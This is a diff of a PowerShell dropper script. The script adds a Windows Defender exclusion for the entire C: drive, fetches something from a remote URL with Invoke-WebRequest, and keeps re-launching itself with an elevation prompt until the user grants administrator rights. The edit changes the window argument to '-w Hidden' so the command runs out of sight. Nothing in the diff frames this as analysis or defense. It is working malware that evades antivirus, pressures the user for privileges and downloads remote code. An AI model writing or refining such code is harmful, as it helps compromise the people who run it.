@@ -3,12 +3,12 @@ $command = "Add-MpPreference -ExclusionPath 'C:/' ;Invoke-WebRequest -Uri 'https
 if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
     do {
         try {
-             Start-Process -FilePath "powershell" -ArgumentList "-w HiddenStyle -c $command" -Verb RunAs -ErrorAction SilentlyContinue
+             Start-Process -FilePath "powershell" -ArgumentList "-w Hidden -c $command" -Verb RunAs -ErrorAction SilentlyContinue
             exit
         } catch {
             Write-Host "hh"
         }
     } while ($true)
 } else {
-     Start-Process -FilePath "powershell" -ArgumentList "-w HiddenStyle -c $command" -Verb RunAs -ErrorAction SilentlyContinue
+     Start-Process -FilePath "powershell" -ArgumentList "-w Hidden -c $command" -Verb RunAs -ErrorAction SilentlyContinue
 }
